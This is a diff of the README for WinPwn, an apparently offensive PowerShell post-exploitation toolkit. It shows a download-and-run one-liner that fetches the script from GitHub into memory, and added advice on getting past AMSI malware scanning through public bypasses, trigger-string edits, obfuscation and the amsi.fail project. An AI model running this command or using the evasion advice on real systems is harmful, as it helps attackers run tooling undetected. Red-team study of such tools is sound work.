@@ -11,7 +11,9 @@ Just Import the Modules with:
 `Import-Module .\WinPwn.ps1` or 
 `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')`
 
-To bypass AMSI take one of the existing [bypass techniques](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), find the AMSI [trigger](https://github.com/RythmStick/AMSITrigger) and manually change it or encode the trigger string. Alternatively obfuscate the whole script.
+To bypass AMSI take one of the existing [bypass techniques](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), find the AMSI [trigger](https://github.com/RythmStick/AMSITrigger) and manually change it in the bypass function or encode the trigger string. Alternatively obfuscate the whole script. 
+
+If you are using `ObfusWinPwn.ps1` - its now making use of the project https://amsi.fail/ by [Flangvik](https://github.com/Flangvik), i am not responsible for the code hosted there - but the project is cool so im supporting it here.
 
 To spawn a new protected PowerShell Process that is set to run with BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON process mitigation:
 
